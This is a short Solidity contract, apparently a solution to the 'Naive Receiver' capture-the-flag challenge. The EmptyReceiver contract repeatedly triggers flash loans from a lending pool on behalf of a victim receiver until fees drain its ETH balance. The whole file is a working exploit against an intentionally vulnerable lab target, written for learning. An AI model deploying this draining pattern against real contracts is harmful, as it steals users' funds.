// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "./NaiveReceiverLenderPool.sol";

/**
 * @title EmptyReceiver
 * @author pawanpaudel93
 */
contract EmptyReceiver {
    IERC3156FlashBorrower private receiver;
    NaiveReceiverLenderPool private pool;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _receiver, address payable _pool) {
        receiver = IERC3156FlashBorrower(_receiver);
        pool = NaiveReceiverLenderPool(_pool);
    }

    function empty() external returns (bool) {
        uint256 flashLoanFee = 1 ether;
        while (address(receiver).balance >= flashLoanFee) {
            pool.flashLoan(receiver, ETH, 1 ether, "0x");
        }
        return true;
    }

    // Allow deposits of ETH
    receive() external payable {}
}
